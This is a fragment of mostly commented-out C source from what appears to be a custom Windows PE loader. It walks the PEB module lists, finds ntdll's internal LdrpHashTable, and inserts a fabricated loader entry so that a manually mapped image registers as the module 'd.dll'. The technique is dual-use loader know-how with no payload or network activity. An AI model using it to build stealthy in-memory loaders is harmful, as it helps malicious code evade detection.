//		entry = CONTAINING_RECORD(moduleList, LDR_DATA_TABLE_ENTRY_INTRN, InMemoryOrderLinks);
//		pDataEntryName = ((PUNICODE_STRING)&entry->BaseDllName);
//		for (i = 0; ; i++) {
//			if (UpcaseUnicodeChar(pDataEntryName->Buffer[i]) != (L"NTDLL.DLL")[i])
//				goto lbl_next_entry;
//			if (pDataEntryName->Buffer[i] == L'\0')
//				goto lbl_entry;
//		}
//lbl_next_entry:
//		moduleList = moduleList->Flink;
//	} while (moduleList != moduleListTail);
//
//	return NULL;
//lbl_entry:
//	EntryNtdll = entry;
//	moduleListTail = &EntryNtdll->HashLinks;
//	moduleList = moduleListTail->Flink;
//	do {
//		if ((((char*)moduleList) > ((char*)EntryNtdll->DllBase)) && (((char*)moduleList) < ((char*)EntryNtdll->DllBase + EntryNtdll->SizeOfImage))) {
//			goto lbl_entry_in_hash_table;
//		}
//		moduleList = moduleList->Flink;
//	} while (moduleList != moduleListTail);
//	return NULL;
//lbl_entry_in_hash_table:
//
//	i = _HashUnicodeString(pDataEntryName, TRUE) & (LDR_HASH_TABLE_ENTRIES - 1);
//	Result = moduleList - i;
//	return moduleList - i;
//}
//
//VOID InsertTailList(PLIST_ENTRY ListHead, PLIST_ENTRY Entry)
//{
//	PLIST_ENTRY OldBlink;
//	OldBlink = ListHead->Blink;
//	Entry->Flink = ListHead;
//	Entry->Blink = OldBlink;
//	OldBlink->Flink = Entry;
//	ListHead->Blink = Entry;
//}
//
//BOOL AddDllInDataTableEntry(char* image_base) {
//#if defined(_WIN64)
//	PTEB pTeb = ((PTEB)(__readgsqword(offsetof(NT_TIB, Self))));
//#else
//	PTEB pTeb = (PTEB)__readfsdword(0x18);
//#endif
//	PPEB_INTRN pPEB = pTeb->ProcessEnvironmentBlock;
//	PLIST_ENTRY moduleListTail = &pPEB->Ldr->InMemoryOrderModuleList;
//	PLIST_ENTRY moduleList = moduleListTail->Flink;
//
//#ifdef _WIN64
//	PIMAGE_NT_HEADERS64 NtHeaders = (PIMAGE_NT_HEADERS64)(image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew);
//#else
//	PIMAGE_NT_HEADERS32 NtHeaders = (PIMAGE_NT_HEADERS32)(image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew);
//#endif
//	PLIST_ENTRY LdrpHashTable = GetLdrpHashTable();
//	if (LdrpHashTable == NULL)
//		return FALSE;
//
//	HANDLE hHeap = ep_GetProcessHeap();
//	PLDR_DATA_TABLE_ENTRY_INTRN LdrEntry = ep_HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(LDR_DATA_TABLE_ENTRY_INTRN));
//
//	LdrEntry->OriginalBase = LdrEntry->DllBase = image_base;
//	LdrEntry->SizeOfImage = NtHeaders->OptionalHeader.SizeOfImage;
//	LdrEntry->EntryPoint = image_base + NtHeaders->OptionalHeader.AddressOfEntryPoint;
//	LdrEntry->TimeDateStamp = NtHeaders->FileHeader.TimeDateStamp;
//	LdrEntry->PatchInformation = NULL;
//	LdrEntry->LoadCount = 1;
//	LdrEntry->Flags |= LDRP_IMAGE_DLL; //= 0x0000a2c4;// |= LDRP_IMAGE_DLL;
//
//    WCHAR DllName[] = L"d.dll";
//	WCHAR FullDllName[] = L"c:\\d.dll";
//	
//	LdrEntry->BaseDllName.Buffer = (PWSTR)ep_HeapAlloc(hHeap, 0, sizeof(DllName));
//	ep_memcpy(LdrEntry->BaseDllName.Buffer, DllName, sizeof(DllName));
//	LdrEntry->BaseDllName.Length = sizeof(DllName) - sizeof(WCHAR);
//	LdrEntry->BaseDllName.MaximumLength = sizeof(DllName);
//
//	LdrEntry->FullDllName.Buffer = (PWSTR)ep_HeapAlloc(hHeap, 0, sizeof(FullDllName));
//	ep_memcpy(LdrEntry->FullDllName.Buffer, FullDllName, sizeof(FullDllName));
//	LdrEntry->FullDllName.Length = sizeof(FullDllName) - sizeof(WCHAR);
//	LdrEntry->FullDllName.MaximumLength = sizeof(FullDllName);
//
//	LdrEntry->DdagNode = ep_HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(LDR_DDAG_NODE));
//
//	PPEB_LDR_DATA_INTRN PebData = pPEB->Ldr;
//	ULONG i;
//	ULONG hash = _HashUnicodeString(&LdrEntry->BaseDllName, TRUE);
//	LdrEntry->BaseNameHashValue = hash;
//	i = hash & (LDR_HASH_TABLE_ENTRIES - 1);
//	InsertTailList(&LdrpHashTable[i], &LdrEntry->HashLinks);
//
//	/* Insert into other lists */
//	InsertTailList(&PebData->InLoadOrderModuleList, &LdrEntry->InLoadOrderLinks);
//	InsertTailList(&PebData->InMemoryOrderModuleList, &LdrEntry->InMemoryOrderLinks);
//	InsertTailList(&PebData->InInitializationOrderModuleList, &LdrEntry->InInitializationOrderLinks);
//	
//
//    HMODULE jj = GetModuleHandleW(L"d.dll");
//
//
//	//
//
//	//Length = RtlDosSearchPath_U(DllPath ? DllPath : LdrpDefaultPath.Buffer,
//	//	DllName,
//	//	NULL,
//	//	BufSize,
//	//	FullDllName->Buffer,
//	//	&BaseDllName->Buffer);
//
//	//if (!Length || Length > BufSize)
//	//{
//	//	if (ShowSnaps)
//	//	{
//	//		DPRINT1("LDR: LdrResolveDllName - Unable to find ");
//	//		DPRINT1("%ws from %ws\n", DllName, DllPath ? DllPath : LdrpDefaultPath.Buffer);
//	//	}
//
//	//	LdrpFreeUnicodeString(FullDllName);
//	//	return FALSE;
//	//}
//
//	///* Construct full DLL name */
//	//FullDllName->Length = Length;
//	//FullDllName->MaximumLength = FullDllName->Length + sizeof(UNICODE_NULL);
//	////LdrEntry->BaseDllName.Buffer
//
//	return TRUE;
//}
////
////
////PLDR_DATA_TABLE_ENTRY_INTRN LdrpAllocateDataTableEntry(PVOID BaseAddress)
////{
////	PLDR_DATA_TABLE_ENTRY_INTRN LdrEntry = NULL;
////	PIMAGE_NT_HEADERS NtHeader;
////
////	/* Make sure the header is valid */
////	NtHeader = RtlImageNtHeader(BaseAddress);
////
////	if (NtHeader)
////	{
////		/* Allocate an entry */
////		LdrEntry = RtlAllocateHeap(LdrpHeap,
////			HEAP_ZERO_MEMORY,
////			sizeof(LDR_DATA_TABLE_ENTRY_INTRN));
////
////		/* Make sure we got one */
////		if (LdrEntry)
////		{
////			/* Set it up */
////			LdrEntry->DllBase = BaseAddress;
////			LdrEntry->SizeOfImage = NtHeader->OptionalHeader.SizeOfImage;
////			LdrEntry->TimeDateStamp = NtHeader->FileHeader.TimeDateStamp;
////			LdrEntry->PatchInformation = NULL;
////		}
////	}
////
////	/* Return the entry */
////	return LdrEntry;
////}


#pragma data_seg(pop)
#pragma code_seg(pop)

